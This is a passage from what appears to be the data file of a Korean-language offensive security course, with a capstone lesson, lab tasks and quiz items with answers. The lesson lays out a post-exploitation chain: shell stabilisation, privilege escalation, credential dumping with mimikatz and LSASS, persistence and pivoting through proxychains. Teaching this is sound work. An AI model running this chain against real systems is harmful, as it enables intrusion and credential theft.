    e:"방어를 아는 공격자는 <b>'이게 어떻게 잡히나'</b>를 압니다. 그래서 탐지 지표를 안 만들고, 정상 트래픽에 섞이고, 은밀한 기법을 고릅니다. 반대로 공격을 아는 방어자가 가장 강합니다 — 당신이 그 양쪽입니다."}]},

{d:80,t:"[상승 종합] 발판에서 완전 장악까지",g:"셸 획득부터 root/SYSTEM, 자격증명 수집, 내부 이동까지 전 과정을 잇는다.",boss:true,
c:"<p><b>ACT 3을 마쳤습니다.</b> ACT 1·2에서 웹으로 <b>발판</b>을 얻었고, 이제 그 발판에서 <b>시스템을 완전히 장악</b>하는 전 과정을 손에 넣었습니다.</p><p><b>침투 후 표준 흐름 — 몸에 익힐 순서</b></p><p><b>1. 셸 안정화</b> — python pty → stty → <code>export TERM</code>. 반쪽 셸을 완전하게.<br><b>2. 초기 열거</b> — <code>id → sudo -l → uname -a → 홈·설정 → SUID·cron</code>. 손으로 먼저, 그다음 linpeas/winPEAS.<br><b>3. 권한 상승</b> — 리눅스: sudo·SUID·cron·capabilities·커널. 윈도우: SeImpersonate→Potato·서비스·저장 자격증명. 오설정을 커널보다 먼저.<br><b>4. 자격증명 수집</b> — shadow·SSH 키·config·mimikatz·LSASS. 다음 호스트의 열쇠.<br><b>5. 지속성** (허가된 경우) — SSH 키·서비스, 은밀하게.<br><b>6. 피벗팅** — 침투 호스트를 발판으로 내부망 스캔·공격.<br><b>7. 반복** — 다음 호스트에서 1번부터. 자격증명을 재사용하며 확장.</b></p><p><b>사슬로 잇기</b><br>웹 SQLi로 관리자 해시 → 크랙 → 로그인 → 파일 업로드로 웹셸 → 리버스 셸 → 셸 안정화 → sudo -l에서 GTFOBins → root → shadow 크랙 → 다른 계정 비밀번호 → 그 계정으로 내부 DB 서버 SSH → 피벗 → 도메인 컨트롤러... <b>하나가 다음의 열쇠입니다.</b></p><p><b>막히면? Enumerate more.</b> 권한 상승도 같습니다 — 안 본 SUID, 안 확인한 sudo, 안 뒤진 홈, 안 돌린 pspy, 안 본 capabilities·그룹. linpeas의 노랑까지 다 봤나?</p><p><b>다음 여정</b><br>· <b>ACT 4</b> Active Directory — 도메인 전체를 장악하는 공격(Kerberoasting·pass-the-hash·golden ticket). 윈도우 기업 환경의 핵심.<br>· 그 너머 익스플로잇 개발·고급 회피.</p><p><b>당신은 이제</b> 웹으로 뚫고, 셸을 안정시키고, root/SYSTEM으로 올라가고, 자격증명을 모아 내부로 퍼질 수 있습니다. <b>그리고 그 모든 것이 방어 코스에서 어떻게 탐지되는지</b> 압니다. 공격과 방어를 함께 보는 — 가장 강한 보안 엔지니어의 눈을 갖춰가고 있습니다.</p><p>수고하셨습니다.</p>",
term:"# 발판에서 완전 장악까지 — 이 순서를 외운다\n[셸] 웹셸 -> 리버스 셸 -> 안정화(python pty; stty)\n[열거] id; sudo -l; uname -a; find / -perm -4000; linpeas\n[상승] GTFOBins / Potato -> root / SYSTEM\n[수집] shadow/mimikatz -> 자격증명\n[피벗] ssh -D + proxychains -> 내부망\n[반복] 다음 호스트에서 1번부터",
lab:["실습 표적에서 웹 침투로 리버스 셸을 잡는다","python pty·stty로 셸을 완전히 안정화한다","<code>id·sudo -l·uname·SUID·cron</code>을 손으로 열거한다","linpeas/winPEAS로 빠뜨린 벡터를 채운다","오설정(sudo·SUID·서비스)으로 root/SYSTEM을 획득한다","자격증명(shadow·SSH키·mimikatz)을 수집한다","피벗을 구성해 내부망 호스트를 스캔한다","각 단계가 방어 코스에서 어떻게 탐지되는지 대응시킨다","권한 상승 치트시트(리눅스+윈도우)를 완성한다"],
q:[{t:"셸을 잡은 직후의 올바른 첫 두 단계는?",o:["바로 커널 익스플로잇","① 셸 안정화(python pty) → ② 기본 열거(id·sudo -l·SUID)","비밀번호 무차별","재부팅"],a:1,
  e:"<b>안정화 → 열거</b>입니다. 반쪽 셸로는 sudo·상승이 어렵고, 열거 없이는 어디를 칠지 모릅니다. 커널 익스플로잇은 오설정을 다 확인한 뒤 마지막 수단입니다."},
   {t:"권한 상승에서 막혔을 때의 원칙은(ACT 0·1과 동일)?",o:["표적 변경","Enumerate more — 안 본 SUID·안 확인한 sudo·안 뒤진 홈·안 돌린 pspy·안 본 capabilities를 점검","포기","커널만 시도"],a:1,
    e:"권한 상승도 <b>열거 부족</b>이 막힘의 원인입니다. SUID·sudo·cron·capabilities·그룹·홈·설정을 다 봤나, linpeas의 노랑까지 검토했나를 점검하면 대개 길이 보입니다."},
   {k:"cmd",t:"침투한 리눅스 셸에서 권한 상승의 <b>1순위 점검</b> — 비밀번호 없이 실행 가능한 sudo 명령을 확인하는 명령을 입력하세요.",
    ph:"sudo ...","a":["sudo -l"],"re":["^(sudo\\s+)?-l$"],
    hint:"sudo의 list 옵션입니다.",
    e:"<code>sudo -l</code> — 권한 상승의 첫 점검입니다. <code>NOPASSWD</code> 항목이 있으면 GTFOBins에서 악용법을 찾아 즉시 root. ACT 3 완주를 축하합니다 — 다음은 Active Directory입니다."}]}

]}
];
